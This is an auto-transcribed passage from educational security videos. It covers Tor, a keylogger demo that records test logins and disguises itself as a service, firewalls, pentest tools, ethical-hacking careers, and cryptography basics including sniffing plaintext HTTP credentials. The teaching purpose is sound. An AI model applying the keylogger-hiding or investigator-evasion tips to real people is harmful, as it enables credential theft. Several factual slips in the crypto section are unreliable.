exercise uh what we want is we can go on
to register.com or we can go on to
godaddy.com and we can purchase a
particular domain for example something
like this instead of the o's i'm typing
in a couple of zeros for the facebook
and see let's see if anything of that is
available now something something.photo
is available or
facetips.com is available uh there are
other options that are making over here
that they're giving us over here and
once we purchase this we can then have
our own hosting uh with our web hosting
as a service and
you can have a linux based hosting or a
windows-based hosting depending on what
you want and that's where your shared
hosting comes with the picture if you
just want uh if you want to look at a
virtual server and you want to render
server over there itself you can move on
to
rackspace.com and here in your services
you can have physical server or a
virtual server in a public cloud your
other cloud providers for example would
be amazon aws and on aws you can
basically look at ec2 elastic compute
cloud which is basically virtual servers
in the cloud and over here you can rent
out a server with whatever capacity you
require you'll obviously have to pay the
rent for what those servers are going to
cost but once you have those servers you
can then launch any services on top of
it looking at other services that we
have we talked about
tor is a onion routing uh software that
allows users to browse the web
anonymously so we can just go online and
we can try to spoof our identity and i'm
going to show you how so i've got a
vmware workstation right here the one so
we're just going to pull that up and
we're going to power on a windows 7
machine where we're going to look at the
onion routing so windows machine has
booted up we're just going to log in and
this is my windows 7 machine now i've
got a chrome browser right here and
we're going to go to a website called
cmyip.com which is going to give the ip
address that i'm currently using so
right now i'm not on connected to any
vpn or anything and you can see that's
my ip address that i'm utilizing now if
i want to anonymize myself what i'm
going to do is i am going to use star
and that's the tower browser that's set
up right there if i click on it it's
going to open up the software and it's
going to create a new network and it's
going to connect to the tor network and
allow me to anonymize myself right so
that's the top browser opening up and uh
giving me a new browser over here so
i've got one which is the old one which
is uh my current ip address if i just
refresh that you'll see that i'm still
on the same ip address as far as this
browser is concerned there's a refresh
and it's still showing me the same ip
address where if i go on to thor right
now and if i go to see my ip.com you
will see that it is going to give me and
you can see the amount of time it is
taking to reach that site that's because
i am using a vpn and there's a lot of
encryption running off and you can see
now i'm certainly connected via hong
kong and even to reach this site what
tor does is it gives me a proxy chain a
proxy chain is where it creates multiple
hops to hide my identity and before i
reach see my ip.com i am using three
different ip addresses over here one in
france one in germany and one in hong
kong so if i do something over here to
trace back my steps to my actual ip
address the law enforcement agencies or
anyone who is going to search like a
forensic investigator would have to go
through these ip addresses before they
come back to me now it's not impossible
but the effort and time that's going to
be taken to come across three different
countries is going to be phenomenal so
it may just defeat the purpose of having
so much resources spent to identify who
did what so that's what torque does for
us all right moving on from tor we are
going to look at key keyloggers
keyloggers are basically softwares that
run in the background and record all the
keystrokes of the user so if i've got a
keylogger installed right now whatever i
type will be stored in a text file for
the hacker so that they can look at it
later on and just to give you an example
of that we go back to my vmware
workstation and we open up another
windows 7 machine i'm going to power
this on and i'm going to close this one
till then so this virtual machine has
booted up we are going to use
one login as user one just close all
these softwares uh which are not
required and once this machine is booted
up what we're going to do is i'm just
going to open up a random websites and
see what we're doing basically there's a
keylogger that's there in the startup
that's
going to record our keystrokes and we
just want to see what it actually does
now firefox is getting updated so let's
hold on now this is the latest version
of firefox right and we're just going to
go to let's say facebook.com
wait for the website to open up all
right let's try opening it up again and
that's facebook.com and we're just going
to type in some random username and
password somewhere someone at
somewhere.com and the password being
again asd at the rate one two three four
five six seven eight nine zero log in
obviously that login is not going to
work user probably doesn't exist or if
it does the password probably is
incorrect and uh so we're going to close
this we're going to let's say open up
another browser window go to another
site
rediff.com and then go to rediff mail
try the same thing over here someone at
somewhere.com password is right one two
three four five six seven whatever it is
don't say we can see the combination is
incorrect now there's a keylogger
running in the background and what we
want is we now want to open up the
keylogger now it is visible here because
i've kept it visible you can hide it in
the start menu and there's a shortcut
key for you to pull it up later on so
this completely becomes invisible and
what it can do is it basically creates a
record of whatever you have been doing
so far so you can see these things
populating on the 25th of december so if
i look at the visited website you can
see i opened up mozilla firefox the
first where it uh there was a problem
loading the page then we opened up
facebook then we opened up
rediffmail.com and so on so forth said
this it just gives me the list of
visited websites whereas if i look at
keystrokes and clipboard you will see
whatever we have typed in so we first
typed in facebook.com then again uh the
second time i try try to type in then i
hit backspace then i type in
facebook.com and then you can see i
typed in someone at somewhere.com and
then tab asd at the rate one two three
four five six seven eight nine zero we
closed up the browser we opened up a new
one and we went on to redifemail.com and
then you can see me typing this one then
going back one space then the rest of
what i typed and then the password
coming in so that's what a keylogger
does if you look at the taskbar it's not
going to show you a keylogger running in
the background it's in processes you're
not going to see anything at all but
it's going to mask itself as a service
so if you look into the properties you
can see that icon coming in over here
which matches this one and so you can
see that this is masking itself as a
service dot exe if this gets hidden as
well it would be very difficult for a
user to even identify this all right so
that's what a key logger is moving on
let's see what else we want to talk
about so we've talked about tor we have
talked about keyloggers and now we want
to talk about firewalls now for
keyloggers to be prevented we need
antiviruses right so we need a good
antivirus program that's going to be
installed updated and run on a regular
basis to protect ourselves from malwares
but what about network connections and
you need a firewall and a system to
prevent or to detect what kind of
connections are going on in the first
place now we cannot rely on software as
one hundred percent so even if a
firewall is not configured properly
that's that's going to be a problem so
what we need to do is we have to have a
firewall configure it correctly and then
allow and disallow certain activity from
off uh happening and what we're going to
do is i've got such a system on my
machine here i use a software called
glasswire what it does is it is a
network analyzer so it allows me to
analyze whatever is going on you can see
all the apps that i'm utilizing and how
much upload and download they have been
doing all the traffic so you can see the
protocols that i'm utilizing so i come
to know what's going on in the
background and this gives me the entire
graph of how much i have been doing for
the past 24 hours past three hours past
five minutes and so on so forth right so
this is what the activities and these
are the alerts that it has been
generating i can click on those alert
and it will start telling me what it was
all about if the graph doesn't work for
me it gives me usage as well so how much
i have utilized since i've installed
this software right and what
applications have been utilized which
hosts have been connected to and the
traffic type that was utilized and then
the things on my network so these are
the devices that i have currently on my
network that has been that have been
identified and then comes the firewall
so on the firewall the firewall is
clicked on you see all those services
that have been identified
and you can just click on a particular
service to lock that service so this
becomes a discovery tool identifies
whatever networking is going on gives me
all that information and then i can look
at and i can just click on any of these
services that i find it as malicious and
block them i can create different
profiles for different applications as i
am as and when i want them and these are
the alerts so you can see that this was
the first time a network connection was
looked at from vmware and what this
allows me to do is whenever i execute a
file it can upload it to virustotal.com
and scan it as a third party antivirus
to ensure that there is nothing
malicious on it so i already have an
antivirus over here but if this ever
gets compromised i still can rely on a
third party service where in real time
as an and when i execute my applications
uh they would be verified and i would be
assured that nothing is wrong with my
system and this software that i'm
utilizing glasswire basic is free and
then there are paid versions as well
it's just glasswire.com is where you're
going to find this moving on rootkit
rootkits are also malicious softwares
that you allow and unauthorized user to
have access to a computer to restrict
areas of its software now a rootkitten
is a census which
a software a malicious software that
infects a machine and prevents a from
some functionality from it like hiding
data or preventing users from running
antiviruses and it's basically a
malicious software that is used to hide
information from the victim so that they
would not realize that they have
actually been compromised it's going to
be a difficult showing of a root kit so
i cannot show that demo to you so we're
just going to move on and we're going to
talk about ethical hacking techniques
now now when we say ethical hacking
techniques we want to look at what kind
of audits are available when we want to
do ethical hacking so there's a black
box audit a white box audit and a gray
box audit so if i'm invited in an
organization to conduct a test to
conduct a audit to conduct a
vulnerability assessment or a
penetration test to identify
vulnerabilities and then try to plug
them out they are going to give me three
different variations in a black box
audit they are not going to tell me
about the infrastructure they are not
going to give me any information and
they want me to start from the basics of
gathering information identifying their
systems and based on the information
that i gather whether i'm able to
develop any hacks and compromise their
infrastructure so it will be a
simulation of a hacker who's sitting
outside the organization and trying to
find a way in whereas a white box audit
is where full infrastructure knowledge
is given anything and everything that is
required for an audit is given and this
is a simulation of an insider attack a
person sitting inside the organization
misusing their permissions and then
trying to compromise trying to get
access to data that they do not have
access to so the simulation is from a
malicious insider a gray box is where
some partial knowledge is available and
from that partial knowledge you're going
to try to build up more information and
then you're going to try to get access
to those resources what are the tools
that we utilize so we've already had a
couple of demos on keyloggers sql
injection sql map and so on so forth
metasploit is a very much used tool for
penetration testing and uh
having knowledge on metasploit is very
much necessary as far as ethical hacking
is concerned nmap this is a tool used
for network discovery necessary scanner
wireshark is a packet capturer that
allows you to capture packets and
analyze whatever is going on sql map is
something that we have seen a sql
injection attack tool which generates
its own queries and john the ripper is a
password cracking tool uh backtrack used
to be an operating system that was
utilized for penetration testing however
backtrack has now been replaced by
something called kali linux and that's
the operating system that we have
utilized in all our demos where we try
to look at sql map and those injection
attacks that we did so what are the
areas of ethical hacking we have just
talked about all these areas as well
network services we looked at the
glasswire application that showed us how
my machine is consuming networks which
protocols are being consumed how the
connections are being
created if somebody's able to install a
trojan on my machine it is going to try
to create a new connection on the
network with the hacker to allow that
hacker a backdoor access now if i have
that glass wire or a similar firewall
implemented it is this wire wall that is
going to detect it and prevent that
connection from happening so if i
install a software that is certainly
suspicious or that install something
else in the background that i may not be
aware of that tool is going to identify
all the connections that are being made
and it is going to highlight that
connection i need to go through all of
those connections and identify whether
they are legit or not and if i find some
suspicious or doubtful i'm going to
block that connection and then i'm going
to investigate what's going on and
that's where ethical hacking comes into
the picture you want to find out if your
firewall that you have implemented is
going to work correctly or not if the
configuration of the firewall is done
properly or if the firewall is
misconfigured is it leaking out
information right at the same time
you're looking at web applications we
looked at the ovas broken web
application where we did some sql
injection attacks right so that was a
weakness or a vulnerability in that
application which would allow us to
bypass authentication and get access to
resources that you are not authorized
for and then client-side attack should
be where
you install keylogger at the end of the
at the client system and then you try to
capture whatever data the user is typing
in like usernames and passwords on the
facebook and the rediffmail.com website
that we saw and then try to misuse that
information to get access to those
resources then wi-fi networks right
wi-fi is something that we use on a
regular basis we got our smart devices
nowadays smartphones tablets phablets
that we can connect to wi-fi and start
using all our services our banking
applications and our smartphones and
thus we want to ensure that wireless
connectivity is simple and is secure so
you want to use encryption mechanisms
you want to use tools on your
smartphones antiviruses firewalls on
your smartphones to ensure that whatever
you're utilizing is going to remain
secure and then social engineering we've
looked at the phishing website on
facebook.com we've seen how easy it is
to clone websites and host them on
apache server so if you look at it
from ethical hackers perspective the job
of ethical hacker is to simulate these
kind of attacks that the hacker may
conduct and
first of all you're basically going to
find out areas where these attacks can
happen think of it from a hacker's
perspective try to simulate those
attacks and see if those attacks are
going to be effective can those attacks
be prevented and can your current
security controls that you have put in
place identify detect and prevent these
attacks from happening in the first
place and that is what ethical hacking
is all about with the increase in the
number of cyber crimes across the globe
there is also an increase in the number
of cyber security jobs and the role of
an ethical hacker tops the list hi guys
this is shruti from simply learn and
today i will run you through this video
on ethical hacking career so let's get
started and explore the world of ethical
hacking let's begin with a few facts did
you know that by the year 2021 there
will be 3.5 million cyber security job
openings that is a huge number isn't it
and also according to the u.s bureau of
labor statistics there will be 28
increase in the number of jobs from 2016
to 2026 for information security
analysts which includes ethical hackers
this proves that there is a great demand
for ethical hackers at the moment as i
mentioned earlier the number of cyber
crimes across the world will increase as
the digital era will only continue to
grow organizations will be on the
lookout to hire professionals who can
fight these cyber crimes and protect the
company's data and to fight these cyber
crimes we will require individuals who
can think like a hacker and who is that
well to do this job we have ethical
hackers as you might be knowing an
ethical hacker is trained to discover
system vulnerabilities an ethical hacker
is also known as a white hat hacker he
or she is given authorization from the
company to perform security assessments
and at the end an ethical hacker would
have to report the findings back to the
company so that the vulnerabilities can
be fixed an ethical hacker performs
these security assessments with the help
of various hacking techniques and tools
let's now move on to our next topic that
is the steps to become an ethical hacker
you might wonder how to start your
ethical hacking career right well i will
take you through that step by step
firstly the candidate must have a
computer science or an information
technology bachelor's degree it is also
possible to become an ethical hacker
without these degrees but provided you
have the required skill sets and
experience the next requirement to be an
ethical hacker is that the candidate
must have a minimum of two years of
experience in the information security
field you have to start your career with
a software or a networking job and only
then can you move on to the ethical
hacking field you have to start your
career with a software or a networking
job and only then can you move into the
ethical hacking field coming to the
certifications it is necessary for the
candidate to hold various cyber security
certifications certifications play a
vital role in the field of cyber
security your job opportunities can
solely depend on these certifications to
become an ethical hacker you can start
off with the foundational level
certifications such as the ccna and
comchia security plus certifications
finally the last step to become an
ethical hacker is to clear the certified
ethical hacker examination ch
certification is provided by the ec
council it trains the candidate to
protect a company's network by using the
same tools and methods that a hacker
would use the ch exam will have a
duration of 4 hours with 125 number of
questions if the candidate clears this
exam then he or she will become a
certified ethical hacker now that you
know the steps to become an ethical
hacker let's look into the skill sets
which are required to help you achieve
these steps first and foremost an
ethical hacker needs to have an in-depth
knowledge of the working of the
operating systems knowledge of windows
linux and macintosh operating systems is
required for penetration testing
creating exploits and bug hunting
programming will be important so
knowledge of programming languages such
as cec plus plus html python and php
will be very helpful basic knowledge of
networking tcp protocols and osi model
is necessary as networking is the
foundation of cyber security for
securing databases knowledge of sql
nosql postgresql is necessary
cryptography is used to secure
information it is the process of
converting data from a readable format
to a non-readable format and vice versa
cryptanalysis is decryption without a
secret key in most cases certified
ethical hacker would need to perform
cryptanalysis hence ethical hacker has
to be comfortable with cryptography and
cryptanalysis ethical hackers should be
proficient in network security control
measures such as intrusion detection and
intrusion prevention techniques now
let's move on to the responsibilities
which are taken care of by an ethical
hacker let's have a look at these
responsibilities an ethical hacker is
responsible for scanning systems open
and closed ports using tools like nessus
and nmap vulnerabilities and threats are
identified by doing this in addition to
scanning for vulnerabilities they also
search the deep corners of the network
to spot critical information such as
passwords which can make the
organization vulnerable to an attack in
addition to building and maintaining ids
ips and firewalls they also try to evade
these security measures to gauge the
performance of the systems a lot of
times a company's online fraud or online
theft incidents are looked into by an
ethical hacker an ethical hacker also
checks for sniffing networks and
hijacked web servers and applications
those were the responsibilities of an
ethical hacker now let's look into the
various job roles an ethical hacker can
apply for it is a misconception that an
ethical hacker will perform only
penetration testing well there are a
number of other jobs an ethical hacker
can apply for the different job roles
such as that of a penetration tester
information security analyst security
consultant and an information security
manager let's have a look at each of
these job roles one by one a penetration
tester performs the typical
responsibility of an ethical hacker that
is he or she tries to exploit a security
system's vulnerabilities this is carried
out using different hacking tools and
techniques an ethical hacker can also
apply for the role of an information
security analyst there is a difference
between the job rules of a penetration
tester and that of an information
security analyst here the candidate will
be required to primarily design and
protect the organization's network from
various cyber attacks finally the
candidate is also required to document
the identified security breaches so that
it can be omitted the next time the
responsibilities of a security
consultant is more or less similar to
that of an information security analyst
that we saw previously as a security
consultant you will be responsible to
design implement and maintain barrier
security architectures in addition to
this you're also required to upgrade the
security systems as and when required
finally an ethical hacker can also apply
to the role of an information security
manager as the name suggests this role
will require the candidate to possess
managerial skills as an information
security manager is responsible to head
the it and the information security team
now that we have seen the
responsibilities the skills and the
steps to become an ethical hacker let's
have a look at the different companies
hiring ethical hackers to name a few we
have bank of america ernest and young
kpmg urban pro and ibm let's now look
into the salary structure of an ethical
hacker well in india the average annual
salary of a certified ethical hacker is
nearly 4 lakhs 76 000 rupees and in the
us the average annual salary of a
certified ethical hacker is 91 000
now i will guide you through a sample
resume of a penetration tester as you
can see on your screens this is a sample
resume of a penetration tester we will
look into this resume closely and
understand how your resume should look
like if you are applying for the role of
a penetration tester as always you can
start off with your name and your email
id and your phone number followed by a
brief summary of your current job
profile it is prefer to add your
linkedin profile link here and also your
github profile link if you have one as i
mentioned earlier this is a sample
resume for a penetration tester and
hence we have to have more than two
years of experience in the information
security field as you can see under the
experience section the candidate has two
prior experiences out of which the first
experience is that of a software tester
and second is that of a penetration
tester you would have to mention your
latest or current experience at the
beginning you can mention your job role
and the company and the duration under
which you can list out the various
responsibilities that you are looking
into currently if you are a penetration
tester you can mention responsibilities
such as security monitoring black box
testing documentation of the results
vulnerability scanning and so on below
this you can mention your first
company's experience with the roles and
responsibilities that you have performed
earlier here the candidate was a
software tester before becoming a
penetration tester let's move on to the
education section here the candidate
holds a bachelor's degree in computer
science you can mention your degree
followed by the university name or if
you're applying for any other role in
the cyber security domain it is
recommended that you list out the
certifications as well to start off with
a ccna certification will be preferred
followed by a certified ethical hacker
certification which is a must if you are
applying for the role of a penetration
tester in addition to it the certified
expert penetration tester certification
will also hold a great advantage after
mentioning the certifications you can go
ahead and mention your skill sets here
we have the technical skills and
non-technical skills under technical
skills you can mention the programming
languages that you know here we have c c
plus plus java perl you can also mention
the operating systems that you have
worked on for example windows linux unix
and in addition to the programming
languages and the os you can also
mention the tools that you know such as
nmap metasploit tools which will be
helpful if you are applying for the role
of a penetration tester then you can
also mention encryption technologies
knowledge of sql and bug tracking
systems if you have worked on them
before if you have participated in a
code authored you can mention that here
as well under the non-technical skills
you can mention various competitions
that you have taken part in and the
games that you like and other
extracurricular activities finally you
can also mention the projects undertaken
under the projects undertaken you can
talk about the various projects that you
have performed in your company or
outside the company here we have two
projects one as a software test engineer
and second one as a penetration tester
so this is how a resume of a penetration
tester will look like choose from over
300 in-demand skills and get access to 1
000 plus hours of video content for free
visit skill up by simply learn click on
the link in the description to know more
with the rise in censorship and general
fear over privacy loss consumer security
is at an all-time high risk technology
has made our life so much easier while
putting up a decent target on our
personal information it is necessary to
understand how to simultaneously
safeguard our data
and be up to date with the latest
technological developments maintaining
this balance has become easier with
cryptography taking its place in today's
digital world so here's a story to help
you understand cryptography
meet anne
anne wanted to look for a decent
discount on the latest iphone she
started searching on the internet and
found a rather shady website that
offered a 50 discount on the first
purchase once and submitted her payment
details a huge chunk of money was
withdrawn from a bank account just
moments after
devastated and quickly realized she had
failed to notice that the website was a
http web page instead of an https one
the payment information submitted was
not encrypted and it was visible to
anyone keeping an eye including the
website owner and hackers hatchery used
a reputed website which has encrypted
transactions and employs cryptography
our iphone enthusiasts could have
avoided this particular incident
this is why it's never recommended to
visit unknown websites or share any
personal information on them let's now
understand what cryptography is
cryptography is the science of
encrypting or decrypting information to
prevent unauthorized access we transform
our data and personal information so
that only the correct recipient can
understand the message as an essential
aspect of modern data security using
cryptography allows the secure storage
and transmission of data between willing
parties
encryption is the primary route for
employing cryptography by adding certain
algorithms to jumble up the data
decryption is the process of reversing
the work done by encrypting information
so that the data becomes readable again
both of these methods form the basis of
cryptography
for example when simply learn is jumbled
up or changed in any format not many
people can guess the original word by
looking at the encrypted text the only
ones who can are the people who know how
to decrypt the coded word thereby
reversing the process of encryption
any data pre-encryption is called plain
text or clear text to encrypt the
message we use certain algorithms that
serve a single purpose of scrambling the
data to make them unreadable without the
necessary tools these algorithms are
called ciphers
they are a set of detailed steps to be
carried out one after the other to make
sure the data becomes as unreadable as
possible until it reaches the receiver
we take the plain text pass it to the
cipher algorithm and get the encrypted
data this encrypted text is called the
ciphertext and this is the message that
is transferred between the two parties
the key that is being used to scramble
the data is known as the encryption key
these steps that is the cipher and the
encryption key are made known to the
receiver who can then reverse the
encryption on receiving the message
unless any third party manages to find
out both the algorithm and the secret
key that is being used they cannot
decrypt the messages since both of them
are necessary to unlock the hidden
content
wonder what else we would lose if not
for cryptography
any website where you have an account
can read your passwords important emails
can be intercepted and their contents
can be read without encryption during
the transit
more than 65 billion messages are sent
on whatsapp every day all of which are
secured thanks to end to end encryption
there is a huge market opening up for
cryptocurrency which is possible due to
blockchain technology that uses
encryption algorithms and hashing
functions to ensure that the data is
secure if this is of particular interest
to you you can watch our video on
blockchain the link of which will be in
the description
of course there is no single solution to
a problem as diverse as explained there
are three variants of how cryptography
works and is in practice
they are
symmetric encryption
asymmetric encryption
and hashing
let's find out how much we have
understood until now
do you remember the difference between a
cipher and ciphertext
leave your answers in the comments and
before we proceed if you find this video
interesting make sure to give it a
thumbs up before moving ahead
let's look at symmetric encryption first
symmetric encryption uses a single key
for both the encryption and decryption
of data it is comparatively less secure
than asymmetric encryption but much
faster it is a compromise that has to be
embraced in order to deliver data as
fast as possible without leaving
information completely vulnerable
this type of encryption is used when
data rests on servers and identifies
personnel for payment applications and
services the potential drawback with
symmetric encryption is that both the
sender and receiver need to have the
same secret key and it should be kept
hidden at all times
caesar cipher enigma machine are both
symmetric encryption examples that we
will look into further
for example
if alice wants to send a message to bob
she can apply a substitution cipher or a
shift cipher to encrypt the message but
bob must be aware of the same key itself
so he can decrypt it when he finds it
necessary to read the entire message
symmetric encryption uses one of the two
types of ciphers stream ciphers and
block ciphers
block ciphers break the plain text into
blocks of fixed size and use the key to
convert it into ciphertext
stream ciphers convert the plain text
into ciphertext one bit at a time
instead of resorting to breaking them up
into bigger chunks in today's world the
most widely used symmetric encryption
algorithm is aes 256 that stands for
advanced encryption standard which has a
key size of 256 bit with 128 bit and 196
bit key sizes also being available
other primitive algorithms like the data
encryption standard that is the des the
triple data encryption standard 3des and
blowfish have all fallen out of favor
due to the rise of aes
aes chops ups the data into blocks and
performs 10 plus rounds of obscuring and
substituting the message to make it
unreadable
asymmetric encryption on the other hand
has a double whammy at its disposal
there are two different keys at play
here a public key and a private key
the public key is used to encrypt
information pre-transit and a private
key is used to decrypt the information
post transit if alice wants to
communicate with bob using asymmetric
encryption
she encrypts the message using bob's
public key
after receiving the message bob uses his
own private key to decrypt the data this
way nobody can intercept the message in
between transmissions and there is no
need for any secure key exchange for
this to work since the encryption is
done with the public key and the
decryption is done with a private key
that no one except bob has access to
both the keys are necessary to read the
full message
there is also a reverse scenario where
we can use the private key for
encryption and the public key for
decryption a server can sign
non-confidential information using its
private key and anyone who has its
public key can decrypt the message
this mechanism also proves that the
sender is authenticated and there is no
problem with the origin of the
information
rsa encryption is the most widely used
asymmetric encryption standard it is
named after its founders reversed shamir
and adelman and it uses block ciphers
that separate the data into blocks and
obscure the information
widely considered the most secure form
of encryption albeit relatively slower
than aes it is widely used in web
browsing secure identification vpns
emails and chat applications
with so much hanging on the key secrecy
there must be a way to transmit the keys
without others reading our private data
many systems use a combination of
symmetric encryption and asymmetric
encryption to bolster security and match
speed at the same time
since asymmetric encryption takes longer
to decrypt large amounts of data the
full information is encrypted using a
single key that is symmetric encryption
that single key is then transmitted to
the receiver using asymmetric encryption
so you don't have to compromise either
way another route is using the
diffie-hellman key exchange which relies
on a one-way function and is much
tougher to break into
the third variant of cryptography is
termed as hashing
hashing is the process of scrambling a
piece of data beyond recognition it
gives an output of fixed size which is
known as the hash value of the original
data or just hash in general
the calculations that do the job of
messing up the data collection form the
hash function
they are generally not reversible
without resilient brute force mechanisms
and are very helpful when storing data
on website servers that need not be
stored in plain text for example many
websites store your account passwords in
a hashed format so that not even the
administrator can read your credentials
when a user tries to log in they can
compare the entered passwords hash value
with the hash value that is already
stored on the servers for authentication
since the function will always return
the same value for the same input
cryptography has been in practice for
centuries
julius caesar used a substitution shift
to move alphabets a certain number of
spaces beyond their place in the
alphabet table
a spy can't decipher the original
message at first glance for example if
he wanted to pass confidential
information to his armies and decides to
use the substitution shift of plus 2 a
becomes c b becomes d and so on the word
attack when passed through a
substitution shift of plus 3 becomes d w
d f n
this cipher has been appropriately named
the caesar cipher which is one of the
most widely used algorithms
the enigma is probably the most famous
cryptographic cipher device used in
ancient history
it was used by the nazi german armies in
the world wars they were used to protect
confidential political
military and administrative information
and it consisted of three or more rotors
that scrambled the original message
depending on the machine's state at that
time the decryption is similar but it
needs both machines to stay in the same
state before passing the cipher text so
that we receive the same plain text
message
let's take a look at how our data is
protected while we browse the internet
thanks to cryptography here we have a
web-based tool that will help us
understand the process of rsa encryption
we see the entire workflow from
selecting the key size to be used until
the decryption of the cipher text in
order to get the plain text back
as we already know rsa encryption
algorithm falls under the umbrella of
asymmetric key cryptography
that basically implies that we have two
keys at play here a public key and a
private key
typically the public key is used by the
sender to encrypt the message and the
private key is used by the receiver to
decrypt the message
there are some occasions when this
allocation is reversed and we will have
a look at them as well
in rsa we have the choice of key size we
can select any key from a 512 bit to
1024 bit all the way up to a 4096 bit
key the longer the key length the more
complex the encryption process becomes
and thereby strengthening the cipher
text
although with added security more
complex functions take longer to perform
the same operations on similar size of
data we have to keep a balance between
both speed and strength because the
strongest encryption algorithms are of
no use if they cannot be practically
deployed in systems around the world
let's take a 1024 bit key over here
now we need to generate the keys
this generation is done by functions
that operate on past phrases the tool we
are using right now generates this
pseudorandom keys to be used in this
explanation
once we generate the keys you can see
the public key is rather smaller than
the private key which is almost always
the case
these two keys are mathematically linked
with each other
they cannot be substituted with any
other key and in order to encrypt the
original message or decrypt the cipher
text this pair must be kept together the
public key is then sent to the sender
and the receiver keeps the private key
with himself
in this scenario let's try and encrypt a
word simply learn
we have to select if the key being used
for encryption is either private or
public since that affects the process of
scrambling the information since we are
using the public key over here let's
select the same
and copy it and paste over here
the cipher we are using right now is
plain rsa there are some modified
ciphers with their own pros and cons
that can also be used provided we use it
on a regular basis and depending on the
use case as well
once we click on encrypt we can see the
ciphertext being generated over here
the pseudorandom generating functions
are created in such a way that a single
character change in the plaintext will
trigger a completely different
ciphertext this is a security feature to
strengthen the process from brute force
methods
now that we are done with the encryption
process let's take a look at the
decryption part
the receiver gets this cipher text from
the sender with no other key or
supplement
he or she must already possess the
private key generated from the same pair
no other private key can be used to
decrypt the message since they are
mathematically linked
we paste the private key here and select
the same
the cipher must always so be the same
used during the encryption process
once we click decrypt you can see the
original plain text we had decided to
encrypt this sums up the entire process
of rsa encryption and decryption
now some people use it the other way
around we also have the option of using
the private key to encrypt information
and the public key to decrypt it this is
done mostly to validate the origin of
the message since the keys only work in
pairs if a different private key is used
to encrypt the message the public key
cannot decrypt it conversely if the
public key is able to decrypt the
message it must have been encrypted with
the right private key and hence the
rightful owner
here we just have to take the private
key
and use that to encrypt the plain text
and select the same in this checkbox as
well
you can see we have generated a
completely new cipher text
this cipher text will be sent to the
receiver and this time we will use the
public key for decryption
let's select the correct checkbox and
decrypt
and we still get the same output
now let's take a look at practical
example of encryption in the real world
we all use the internet on a daily basis
and many are aware of the implications
of using unsafe websites
let's take a look at wikipedia here
pretty standard https website where the
h stands for secured
let's take a look at how it secures that
data
wireshark is the world's foremost and
most widely used network protocol
analyzer it lets you see what's
happening on your network at a
microscopic level
and we are going to use the software to
see the traffic that is leaving our
machine and to understand how vulnerable
it is
since there are many applications
running in this machine let's apply a
filter that will only show us the
results related to wikipedia
let's search for something that we can
navigate the website with
okay once we get into it a little you
can see some of the requests being
populated over here
let's take a look at the specific
request
these are the data packets that
basically transport the data from our
machine to the internet and vice versa
as you can see there's a bunch of
gibberish data here that doesn't really
reveal anything that we searched or
watched
similarly other secured websites
function the same way and it is very
difficult if at all possible to snoop on
user data this way
to put this in perspective
let's take a look at another website
which is a http web page
this has no encryption enabled from the
server end which makes it vulnerable to
attacks
there is a login form here which needs
legitimate user credentials in order to
grant access let's enter a random pair
of credentials
these obviously won't work but we can
see the manner of data's transfer
unsurprisingly we weren't able to get
into the platform
instead we can see the data packets
let's apply a similar filter that will
help us understand
what request this website is sending
these are the requests being sent by the
http login form to the internet if we
check here
see whatever username and password that
we are entering we can easily see it
with the wireshark
now we used a dummy pair of credentials
if we select the right data packet we
can find our correct credentials
if any website had asked for a payment
information or a legitimate credentials
it would have been really easy to get a
hold of these
to reiterate what we have already
learned we must always avoid http
websites and just unknown or not
trustworthy websites in general because
the problem we saw here is just the tip
of the iceberg even though cryptography
has managed to lessen the risk of cyber
attacks it is still prevalent and we
should always be alert to keep ourselves
safe online
there are two types of encryption in
cryptography
symmetric key cryptography
and asymmetric key cryptography
both of these categories have their pros
and cons and differ only by the
implementation
today we are going to focus exclusively
on symmetric key cryptography
let us have a look at its applications
in order to understand its importance
better
this variant of cryptography is
primarily used in banking applications
where personally identifiable
information needs to be encrypted with
so many aspects of banking moving on to
the internet having a reliable safety
net is crucial
symmetric cryptography helps in
detecting bank fraud and boosts the
security index of these payment gateways
in general
they are also helpful in protecting data
that is not in transit and rests on
servers and data centers
these centers house a massive amount of
data that needs to be encrypted with a
fast and efficient algorithm so that
when the data needs to be recalled by
the respective service there is the
assurance of minor to no delay
while browsing the internet we need
symmetric encryption to browse secure
https websites so that we get an
all-around protection it plays a
significant role in verifying website
server authenticity exchanging the
necessary encryption keys required and
generating a session using those keys to
ensure maximum security
this helps us in preventing the rather
insecure http website format
so let us understand how symmetric key
cryptography works first before moving
on to the specific algorithms
symmetric key cryptography relies on a
single key for the encryption and
decryption of information
both the sender and receiver of the
message need to have a pre-shared secret
key that they will use to convert the
plain text into ciphertext and vice
versa
as you can see in the image the key used
for encryption is the same key needed
for decrypting the message at the other
end the secret key shouldn't be sent
along with the cipher text to the
receiver because that would defeat the
entire purpose of using cryptography key
exchange can be done beforehand using
other algorithms like the diffie-hellman
key exchange protocol for example
for example
if paul wants to send a simple message
to jane they need to have a single
encryption key that both of them must
keep secret to prevent snooping on by
malicious actors
it can be generated by either one of
them but must belong to both of them
before the messages start flowing
suppose the message i am ready is
converted into ciphertext using a
specific substitution cipher by paul
in that case jane must also be aware of
the substitution shift to decrypt the
ciphertext once it reaches home
irrespective of the scenario where
someone manages to grab the ciphertext
mid-transit to try and read the message
not having the secret key renders
everyone helpless looking to snoop in
the symmetric key algorithms like the
data encryption standard have been in
use since the 1970s while the popular
ones like the ees have become the
industry standard today
with the entire architecture of
symmetric cryptography depending on the
single key being used you can understand
why it's of paramount importance to keep
it secret on all occasions
the side effect of having a single key
for the encryption and decryption is it
becomes a single point of failure
anyone who gets their hand on it can
read all the encrypted messages and do
so mainly without the knowledge of the
sender and the receiver
so it is the priority to keep the
encryption and encryption key private at
all times
should it fall into the wrong hands the
third party can send messages to either
the sender or the receiver using the
same key to encrypt the message
upon receiving the message and
decrypting it with the key it is
impossible to guess its origin
if the sender somehow transmits the
secret key along with the cipher text
anyone can intercept the package and
access the information
consequently this encryption category is
down private key cryptography since a
big part of the data's integrity is
riding on the promise that the users can
keep the key secret this terminology
contrasts with asymmetry key
cryptography which is called public key
cryptography because it has two
different keys at play one of which is
public
provided we managed to keep the key
secret we still have to choose what kind
of ciphers we want to use to encrypt
this information in symmetric key
cryptography there are broadly two
categories of ciphers that we can employ
let us have a
look stream ciphers are the algorithms
that encode basic information one bit at
a time
it can change depending on the algorithm
being used but usually it relies on a
single bit or byte to do the encryption
this is the relatively quicker
alternative considering the algorithm
doesn't have to deal with blocks of data
at a single time
every piece of data that goes into the
encryption can and needs to be converted
into binary format
in stream ciphers each binary digit is
encrypted one after the other
the most popular ones are the rc4 salsa
and panama
the binary data is passed through an
encryption key which is a randomly
generated bit stream
upon passing it through we receive the
ciphertext that can be transferred to
